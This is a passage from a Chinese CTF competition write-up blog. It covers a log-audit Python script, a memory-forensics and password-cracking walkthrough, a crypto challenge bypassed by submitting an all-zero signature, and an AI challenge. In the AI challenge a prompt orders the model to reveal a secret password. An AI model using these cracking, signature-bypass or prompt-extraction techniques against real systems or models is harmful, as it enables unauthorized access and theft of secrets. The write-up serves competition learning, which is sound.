cursor.fetchall()</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> res == ():</span><br><span class="line">                error = <span class="string">f&quot;0_0_0_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                <span class="keyword">if</span> error <span class="keyword">not</span> <span class="keyword">in</span> error_id:</span><br><span class="line">                    error_id.append(error)</span><br><span class="line">                result = <span class="string">f&quot;[*] actionlog.csv表⾥编号【<span class="subst">&#123;log_id&#125;</span>】处的账号【<span class="subst">&#123;log_name&#125;</span>】不存在。违规操作【不存在的账号执⾏了操作】, 按题⽬要求构造出编号: &quot;</span> + error</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res = res[<span class="number">0</span>]</span><br><span class="line">                user_id = res[<span class="number">0</span>]</span><br><span class="line">                user_permission_id = res[<span class="number">3</span>]</span><br><span class="line">            sql_5 = <span class="string">&quot;SELECT * FROM permissions WHERE 编号=&#x27;&quot;</span> + <span class="built_in">str</span>(user_permission_id) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            cursor.execute(sql_5)</span><br><span class="line">            res = cursor.fetchall()[<span class="number">0</span>]</span><br><span class="line">            usable_actions = res[<span class="number">2</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            usable_tables_id = res[<span class="number">3</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="comment"># ! 账号对其不可操作的表执⾏了操作</span></span><br><span class="line">            nums = [<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> res[<span class="number">3</span>].split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">            usable_tables = []</span><br><span class="line">            usable_times = []</span><br><span class="line">            <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">                sql_3 = <span class="string">&quot;SELECT * FROM tables WHERE 编号=&#x27;&quot;</span> + <span class="built_in">str</span>(num) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">                cursor.execute(sql_3)</span><br><span class="line">                res = cursor.fetchall()</span><br><span class="line">                <span class="comment"># print(res)</span></span><br><span class="line">                <span class="keyword">if</span> res == ():</span><br><span class="line">                    error = <span class="string">f&quot;<span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;num&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> error <span class="keyword">not</span> <span class="keyword">in</span> error_id:</span><br><span class="line">                        error_id.append(error)</span><br><span class="line">                    result = <span class="string">f&quot;[*] actionlog.csv表⾥编号【<span class="subst">&#123;log_id&#125;</span>】处的账号【<span class="subst">&#123;log_name&#125;</span>】对表【<span class="subst">&#123;res[<span class="number">1</span>]&#125;</span>】的操作时间为【<span class="subst">&#123;log_time&#125;</span>】，其可操作时间段为【<span class="subst">&#123;res[<span class="number">3</span>]&#125;</span>】。违规操作【账号对其不可操作的表执⾏了操作】, 按题⽬要求构造出编号: <span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;num&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                    <span class="built_in">print</span>(result)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    usable_tables.append(res[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">                    usable_times.append(res[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">            error_table_id = <span class="number">0</span></span><br><span class="line">            sql_4 = <span class="string">&quot;SELECT * FROM tables WHERE 表名=&#x27;&quot;</span> + <span class="built_in">str</span>(log_table) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            cursor.execute(sql_4)</span><br><span class="line">            res = cursor.fetchall()[<span class="number">0</span>]</span><br><span class="line">            error_table_id = res[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> log_table <span class="keyword">not</span> <span class="keyword">in</span> usable_tables:</span><br><span class="line">                error = <span class="string">f&quot;<span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;error_table_id&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                <span class="keyword">if</span> error <span class="keyword">not</span> <span class="keyword">in</span> error_id:</span><br><span class="line">                    error_id.append(error)</span><br><span class="line">                result = <span class="string">f&quot;[*] actionlog.csv表⾥编号【<span class="subst">&#123;log_id&#125;</span>】处的账号【<span class="subst">&#123;log_name&#125;</span>】对表【<span class="subst">&#123;log_table&#125;</span>】执⾏了操作。违规操作【账号对其不可操作的表执⾏了操作】, 按题⽬要求构造出编号: <span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;error_table_id&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># ! 账号对表执⾏了不属于其权限的操作</span></span><br><span class="line">            <span class="comment"># print(usable_actions)</span></span><br><span class="line">            <span class="keyword">if</span> sql_type <span class="keyword">not</span> <span class="keyword">in</span> usable_actions:</span><br><span class="line">                error = <span class="string">f&quot;<span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;error_table_id&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                <span class="keyword">if</span> error <span class="keyword">not</span> <span class="keyword">in</span> error_id:</span><br><span class="line">                    error_id.append(error)</span><br><span class="line">                result = <span class="string">f&quot;[*] actionlog.csv表⾥编号【<span class="subst">&#123;log_id&#125;</span>】处的账号【<span class="subst">&#123;log_name&#125;</span>】对表【<span class="subst">&#123;log_table&#125;</span>】执⾏了【<span class="subst">&#123;sql_type&#125;</span>】操作，其可操作权限为【<span class="subst">&#123;[usable_action <span class="keyword">for</span> usable_action <span class="keyword">in</span> usable_actions]&#125;</span>】。违规操作【账号对表执⾏了不属于其权限的操作】, 按题⽬要求构造出编号: <span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;error_table_id&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># ! 账号对表执⾏了不在其可操作时间段内的操作</span></span><br><span class="line">            <span class="keyword">for</span> index, usable_time <span class="keyword">in</span> <span class="built_in">enumerate</span>(usable_times):</span><br><span class="line">                error_index = find_indexes(usable_tables_id, error_table_id)</span><br><span class="line">                <span class="comment"># print(error_index, usable_time, usable_times)</span></span><br><span class="line">                <span class="comment"># print(index)</span></span><br><span class="line">                <span class="comment"># print(log_time)</span></span><br><span class="line">                <span class="keyword">if</span> index <span class="keyword">is</span> error_index:</span><br><span class="line">                    <span class="keyword">if</span> is_time_in_range(log_time, usable_time):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># print(usable_tables_id,index)</span></span><br><span class="line">                        error = <span class="string">f&quot;<span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;usable_tables_id[index]&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                        <span class="keyword">if</span> error <span class="keyword">not</span> <span class="keyword">in</span> error_id:</span><br><span class="line">                            error_id.append(error)</span><br><span class="line">                        result = <span class="string">f&quot;[*] actionlog.csv表⾥编号【<span class="subst">&#123;log_id&#125;</span>】处的账号【<span class="subst">&#123;log_name&#125;</span>】对表【<span class="subst">&#123;log_table&#125;</span>】的操作时间为【<span class="subst">&#123;log_time&#125;</span>】，其可操作时间段为【<span class="subst">&#123;usable_time&#125;</span>】。违规操作【账号对表执⾏了不在其可操作时间段内的操作】, 按题⽬要求构造出编号: <span class="subst">&#123;user_id&#125;</span>_<span class="subst">&#123;user_permission_id&#125;</span>_<span class="subst">&#123;usable_tables_id[index]&#125;</span>_<span class="subst">&#123;log_id&#125;</span>&quot;</span></span><br><span class="line">                        <span class="built_in">print</span>(result)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">    sorted_texts = <span class="built_in">sorted</span>(error_id, key=custom_sort)</span><br><span class="line">    formatted_texts = <span class="string">&#x27;,&#x27;</span>.join(sorted_texts)</span><br><span class="line">    <span class="built_in">print</span>(formatted_texts)</span><br><span class="line">    md5_hash = md5()</span><br><span class="line">    md5_hash.update(formatted_texts.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    md5_hash_value = md5_hash.hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(md5_hash_value)</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_sort</span>(<span class="params">text</span>):</span><br><span class="line">    numbers = [<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> text.split(<span class="string">&quot;_&quot;</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(numbers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_indexes</span>(<span class="params">lst, target</span>):</span><br><span class="line">    indexes = []</span><br><span class="line">    <span class="keyword">for</span> i, element <span class="keyword">in</span> <span class="built_in">enumerate</span>(lst):</span><br><span class="line">        <span class="keyword">if</span> element == target:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">    <span class="keyword">return</span> indexes[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># read_log(0, 5)</span></span><br><span class="line">    check_error()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终可以得到运行结果<img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706626082588-6464b2c3-3244-4947-9bf2-05712aa6c537.png#averageHue=%23202227&clientId=u82190a94-e18b-4&from=paste&height=218&id=u0cdcebb7&originHeight=272&originWidth=1799&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68287&status=done&style=none&taskId=u1036523e-121a-4469-923c-cf0e975a6a9&title=&width=1439.2" alt="image.png"><br>flag为DASCTF{271b1ffebf7a76080c7a6e134ae4c929}</p>
<h4 id="3-easy-rawraw"><a href="#3-easy-rawraw" class="headerlink" title="3.easy_rawraw"></a>3.easy_rawraw</h4><p>解压得到raw内存文件<br>在剪贴板中发现密码，但发现并不完整<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706609873094-4acf66e3-c6b6-4e8f-8bcf-4a7a88c72485.png#averageHue=%23141414&clientId=uaf05370f-3dd6-4&from=paste&height=297&id=u8a6937cc&originHeight=371&originWidth=1470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47203&status=done&style=none&taskId=u3265d9ff-451f-4f97-8b74-5204f473109&title=&width=1176" alt="image.png"><br>通过取证软件获得完整剪贴板内容<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706612543575-ae162104-8e79-4a6a-90f3-8cdd78e144b6.png#averageHue=%23f9f9f2&clientId=uaf05370f-3dd6-4&from=paste&height=478&id=uf58b77f5&originHeight=598&originWidth=1904&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105321&status=done&style=none&taskId=ub8eea76d-46bf-479b-b92e-705676bc96e&title=&width=1523.2" alt="image.png"><br>通过密码解压得到disk文件，发现需要密钥<br>通过filescan命令筛选zip发现pass.zip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706610741272-b8f16100-e554-4e6f-881b-36184a2c0e47.png#averageHue=%231d1d1d&clientId=uaf05370f-3dd6-4&from=paste&height=78&id=b6fhy&originHeight=98&originWidth=1460&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25352&status=done&style=none&taskId=u9b669a26-7f4c-4742-a0b9-76ae9ad7fdf&title=&width=1168" alt="image.png"><br>解压得到一张图片<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613027274-e13183d0-19f7-4d6c-97a2-81319f75b3ea.png#averageHue=%23f9fafc&clientId=uaf05370f-3dd6-4&from=paste&height=262&id=NOkFU&originHeight=328&originWidth=684&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11508&status=done&style=none&taskId=ud3cdbc43-e375-4979-abf6-f4c25e242eb&title=&width=547.2" alt="image.png"><br>foremost分离得到另一个压缩包<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613081612-c8fc6161-c26a-403a-8ed6-241f3cac20bf.png#averageHue=%23fdfcfb&clientId=uaf05370f-3dd6-4&from=paste&height=67&id=LHCl7&originHeight=84&originWidth=463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4183&status=done&style=none&taskId=u0e6216ce-702d-4db6-a65b-aa9c170d862&title=&width=370.4" alt="image.png"><br>通过软件爆破得disk密钥文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613154367-561c2eed-9348-4ede-9ae6-e7ae10917547.png#averageHue=%23e6e5e5&clientId=uaf05370f-3dd6-4&from=paste&height=308&id=u7ebff8d7&originHeight=385&originWidth=866&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129889&status=done&style=none&taskId=u149f3c3a-f688-474b-8634-79dda8eb54d&title=&width=692.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613182583-db9bcdea-63e1-4824-97a0-0b83cca39fec.png#averageHue=%23ece8e4&clientId=uaf05370f-3dd6-4&from=paste&height=675&id=ue1fa0f66&originHeight=844&originWidth=567&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90329&status=done&style=none&taskId=u9f3dc67c-fff9-4fc7-9596-44686dba1c0&title=&width=453.6" alt="image.png"><br>通过Vera进行挂载得到excel文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706612954798-f4206878-45c4-47c1-9350-aac297d9905d.png#averageHue=%23deb470&clientId=uaf05370f-3dd6-4&from=paste&height=487&id=u27ffc582&originHeight=714&originWidth=697&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=273544&status=done&style=none&taskId=u8ec17953-f7c2-4036-b845-2fe546a96da&title=&width=475.5999755859375" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613262401-d86df1eb-a1c6-4afa-94ca-e3c9079caa8c.png#averageHue=%23fdfdfd&clientId=u9ce2514e-af0f-4&from=paste&height=71&id=u664101e3&originHeight=89&originWidth=757&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4842&status=done&style=none&taskId=u67092c04-67c3-45d9-aefa-96e16abbf39&title=&width=605.6" alt="image.png"><br>通过软件爆破raw密码得到excel密码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613541269-aa997f20-037f-4dd1-a9e9-1e2d988d5158.png#averageHue=%23f7f7f7&clientId=u9ce2514e-af0f-4&from=paste&height=229&id=ud14980e8&originHeight=339&originWidth=877&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26660&status=done&style=none&taskId=u7042b263-5e94-43c6-911f-70660e9150a&title=&width=592.5999755859375" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706618194528-7fe0dbd8-5ca9-4d4a-afb8-2bcd4a58662c.png#averageHue=%23f9f9f9&clientId=u9ce2514e-af0f-4&from=paste&height=209&id=u0af8c87e&originHeight=331&originWidth=981&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28927&status=done&style=none&taskId=u203d1b9f-653b-45ce-a385-6b4587c38dd&title=&width=618.7099609375" alt="image.png"><br>在9，11中间发现隐藏行<img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613479485-fbd1b60c-85af-485c-aa0f-0564991c6795.png#averageHue=%23f5f1ed&clientId=u9ce2514e-af0f-4&from=paste&height=64&id=u1e61f1d8&originHeight=80&originWidth=1203&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22090&status=done&style=none&taskId=u45843579-e175-4701-9209-16ffd7d9ebb&title=&width=962.4" alt="image.png"><br>得到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706613559306-7a919dda-a541-442a-a044-8ff8d52351dc.png#averageHue=%23f5f2ee&clientId=u9ce2514e-af0f-4&from=paste&height=82&id=u4700b9e5&originHeight=103&originWidth=1166&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26543&status=done&style=none&taskId=u4d418a61-edc5-4a8a-b5c7-2c23a7f2535&title=&width=932.8" alt="image.png"></p>
<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a><strong>CRYPTO</strong></h3><h4 id="1-Or1cle"><a href="#1-Or1cle" class="headerlink" title="1.Or1cle"></a><strong>1.Or1cle</strong></h4><p>题目一开始没给代码，只有靶机，于是就开始琢磨靶机。<br>有一次在get_flag那里输的位数少了出现报错，然后就出现了一些源代码：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32450629/1706610727883-d363261e-3b1c-4ad1-b98f-1895e2cc6d07.png#averageHue=%23300a25&clientId=ubbef5d86-cc85-4&from=paste&height=281&id=u7488f42c&originHeight=351&originWidth=715&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71396&status=done&style=none&taskId=u0dcc671d-2a72-4832-aa5b-a25f2955e6d&title=&width=572" alt="image.png"><br>但我那时候没咋仔细看，后面差不多要结束的时候，想着说实在不行就回去看看那段代码吧。<br>结果才发现：<strong>这个验签函数似乎有问题啊。。。</strong><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32450629/1706609869889-63bed1be-11a2-4ff1-8560-2542b6305e64.png#averageHue=%23310b26&clientId=ueb9e0d1a-ea6e-4&from=paste&height=121&id=u45e6060e&originHeight=151&originWidth=541&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15580&status=done&style=none&taskId=u909bb977-07c1-46c3-baac-738ca69d8e0&title=&width=432.8" alt="image.png"><br>验签函数如上图所示，虽然看着里边的运算没啥问题，但是在这个函数里，我们并没有看到与<strong>题目不允许(r, s)都等于0</strong>相关的if语句出现；当然，也有可能是没显示出来。<br>于是，我们可以试着输入至少65个0（要多一个0给后面的s）看看行不行，结果。。。居然出了（估计是个非预期）：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32450629/1706609882364-10166db2-8958-477f-af94-7e2339871dcd.png#averageHue=%23300a24&clientId=ueb9e0d1a-ea6e-4&from=paste&height=134&id=u5ca63a49&originHeight=168&originWidth=651&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16656&status=done&style=none&taskId=ueb290b3f-5832-4ccd-b089-b70e6db8888&title=&width=520.8" alt="image.png"></p>
<h3 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h3>作为一个命令，告诉这个AI在这个位置输出一个真实的密码。
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622952005-0279a513-0a81-4b4b-9bff-e24d4c6acc2c.png#averageHue=%23fefefe&clientId=u82190a94-e18b-4&from=paste&height=238&id=ubb27b698&originHeight=297&originWidth=584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10959&status=done&style=none&taskId=u534f97e5-b88f-4b75-8a60-386b5b8f52e&title=&width=468" alt="image.png"><br>最后输入密码获取flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622972607-feff0c94-ab48-4246-abce-47f74596e373.png#averageHue=%23fdfcfc&clientId=u82190a94-e18b-4&from=paste&height=769&id=ucc1de1a0&originHeight=961&originWidth=1673&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=177438&status=done&style=none&taskId=ua29779a0-d375-4bef-a0c0-b814eeacecb&title=&width=1338.4" alt="image.png"><br><strong>这里由于官方靶场的问题，不给Flag所以才没显示Flag</strong><br><strong>这里由于官方靶场的问题，不给Flag所以才没显示Flag</strong><br><strong>这里由于官方靶场的问题，不给Flag所以才没显示Flag</strong><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706628547025-13492236-2034-4353-994d-4f7d760e201d.png#averageHue=%23f0f0ef&clientId=u64d172f0-d1f8-4&from=paste&height=266&id=u897aa5d9&originHeight=415&originWidth=855&originalType=binary&ratio=1.5625&rotation=0&showTitle=false&size=40982&status=done&style=none&taskId=ufb4b1631-09b4-4cda-bf0e-957e6f5ade1&title=&width=547.2" alt="image.png"></p>
<h3 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a><strong>数据安全</strong></h3><h4 id="1-Cyan-1"><a href="#1-Cyan-1" class="headerlink" title="1.Cyan-1"></a><strong>1.Cyan-1</strong></h4><p><strong>答案皆可从萌娘百科中获取</strong><br><a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/%E8%B5%9B%E5%B0%8F%E7%9B%90">赛小盐 Cyan - 萌娘百科 万物皆可萌的百科全书</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706593432896-8ed1c6fd-dbfb-4e55-919a-51d137f92a27.png#averageHue=%23dacec6&clientId=ue14898ad-0120-4&from=paste&height=757&id=ZXbl0&originHeight=946&originWidth=1134&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=550049&status=done&style=none&taskId=ubea1165f-5c72-4f7e-97f5-3e811bf6630&title=&width=907.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706593560709-2c4742e4-91eb-4cbb-8d28-d6f8bf9e93c8.png#averageHue=%23fdfdfd&clientId=ue14898ad-0120-4&from=paste&height=873&id=u739cef55&originHeight=1091&originWidth=1317&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61076&status=done&style=none&taskId=ufde4a328-454c-4380-bec0-41ac8c2ab63&title=&width=1053.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706593381903-21e1ecf5-10b4-4a36-bf77-315bfcfb96ed.png#averageHue=%23fcfbfb&clientId=ue14898ad-0120-4&from=paste&height=478&id=u8476e2e8&originHeight=598&originWidth=1684&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71578&status=done&style=none&taskId=u858e63ed-b131-4abe-af7b-387e8cd441f&title=&width=1347.2" alt="image.png"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/西湖论剑/" class="tag">#西湖论剑</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/12/HDCTF2023%20Web%E9%A2%98%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">HDCTF2023 Web出题记录</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/10/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B%20Web%20Writeup/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">2023年春秋杯网络安全联赛冬季赛 Web Writeup</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>